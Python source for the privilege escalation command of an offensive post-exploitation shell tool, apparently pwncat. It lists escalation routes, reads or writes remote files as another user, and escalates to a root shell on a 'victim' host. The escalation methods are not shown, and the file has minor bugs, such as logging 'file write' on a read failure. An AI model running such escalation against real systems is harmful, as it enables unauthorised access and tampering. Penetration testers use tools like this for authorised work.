#!/usr/bin/env python3
from typing import List, Callable

from rich.table import Table

import pwncat
from pwncat.commands.base import (
    CommandDefinition,
    Complete,
    Parameter,
    StoreConstOnce,
    StoreForAction,
)
from pwncat import privesc
from pwncat.persist import PersistenceError
from pwncat.util import State, console
from colorama import Fore
import argparse
import shutil
import sys


class Command(CommandDefinition):
    """ Attempt various privilege escalation methods. This command will attempt
    search for privilege escalation across all known modules. Privilege escalation
    routes can grant file read, file write or shell capabilities. The "escalate"
    mode will attempt to abuse any of these to gain a shell.

    Further, escalation and file read/write actions will attempt to escalate multiple
    times to reach the target user if possible, attempting all known escalation paths
    until one arrives at the target user. """

    def get_user_choices(self):
        """ Get a list of all users on the remote machine. This is used for
        parameter checking and tab completion of the "users" parameter below. """
        return list(pwncat.victim.users)

    def get_method_ids(self):
        """ Get a list of valid method IDs """
        if pwncat.victim is None:
            return []
        return [method.id for method in pwncat.victim.privesc.methods]

    PROG = "privesc"
    ARGS = {
        "--list,-l": Parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            const="list",
            dest="action",
            help="Enumerate and list available privesc techniques",
        ),
        "--all,-a": Parameter(
            Complete.NONE,
            action="store_const",
            dest="user",
            const=None,
            help="list escalations for all users",
        ),
        "--user,-u": Parameter(
            Complete.CHOICES,
            default="root",
            choices=get_user_choices,
            metavar="USER",
            help="the user to gain privileges as",
        ),
        "--max-depth,-m": Parameter(
            Complete.NONE,
            default=None,
            type=int,
            help="Maximum depth for the privesc search (default: no maximum)",
        ),
        "--read,-r": Parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            const="read",
            dest="action",
            help="Attempt to read a remote file as the specified user",
        ),
        "--write,-w": Parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            const="write",
            dest="action",
            help="Attempt to write a remote file as the specified user",
        ),
        "--path,-p": Parameter(
            Complete.REMOTE_FILE,
            action=StoreForAction(["write", "read"]),
            help="Remote path for read or write actions",
        ),
        "--escalate,-e": Parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            const="escalate",
            dest="action",
            help="Attempt to escalate to gain a full shell as the target user",
        ),
        "--exclude,-x": Parameter(
            Complete.CHOICES,
            action="append",
            choices=get_method_ids,
            metavar="METHOD",
            help="Methods to exclude from the search",
        ),
        "--data,-d": Parameter(
            Complete.LOCAL_FILE,
            action=StoreForAction(["write"]),
            default=None,
            help="The local file to write to the remote file",
        ),
    }
    DEFAULTS = {"action": "list"}

    def run(self, args):

        if args.action == "list":
            techniques = pwncat.victim.privesc.search(args.user, exclude=args.exclude)
            if len(techniques) == 0:
                console.log("no techniques found")
            else:
                for tech in techniques:
                    color = "green" if tech.user == "root" else "green"
                    console.print(
                        f" - [magenta]{tech.get_cap_name()}[/magenta] "
                        f"as [{color}]{tech.user}[/{color}] "
                        f"via {tech.method.get_name(tech)}"
                    )
        elif args.action == "read":
            if not args.path:
                self.parser.error("missing required argument: --path")
            try:
                read_pipe, chain, technique = pwncat.victim.privesc.read_file(
                    args.path, args.user, args.max_depth
                )
                console.log(f"file [green]opened[/green] with {technique}")

                # Read the data from the pipe
                shutil.copyfileobj(read_pipe, sys.stdout.buffer)
                read_pipe.close()

                # Unwrap in case we had to privesc to get here
                pwncat.victim.privesc.unwrap(chain)

            except privesc.PrivescError as exc:
                console.log(f"file write [red]failed[/red]")
        elif args.action == "write":
            # Make sure the correct arguments are present
            if not args.path:
                self.parser.error("missing required argument: --path")
            if not args.data:
                self.parser.error("missing required argument: --data")

            # Read in the data file
            try:
                with open(args.data, "rb") as f:
                    data = f.read()
            except (PermissionError, FileNotFoundError):
                console.log(f"{args.data}: no such file or directory")

            try:
                # Attempt to write the data to the remote file
                chain = pwncat.victim.privesc.write_file(
                    args.path, data, target_user=args.user, depth=args.max_depth,
                )
                pwncat.victim.privesc.unwrap(chain)
                console.log("file write [green]succeeded[/green]")
            except privesc.PrivescError as exc:
                console.log(f"file write [red]failed[/red]: {exc}")
        elif args.action == "escalate":
            try:
                chain = pwncat.victim.privesc.escalate(
                    args.user, depth=args.max_depth, exclude=args.exclude
                )

                console.log("privilege escalation succeeded using:")
                for i, (technique, _) in enumerate(chain):
                    arrow = f"[yellow]\u2ba1[/yellow] "
                    console.log(f"{(i+1)*' '}{arrow}{technique}")

                ident = pwncat.victim.id
                if ident["euid"]["id"] != ident["uid"]["id"]:
                    console.log(
                        "[yellow]warning[/yellow]: euid/uid mismatch - attempting automated fix"
                    )
                    pwncat.victim.command_parser.dispatch_line("euid_fix")

                pwncat.victim.reset()
                pwncat.victim.state = State.RAW
            except privesc.PrivescError as exc:
                console.log(f"privilege escalation [red]failed[/red]: {exc}")
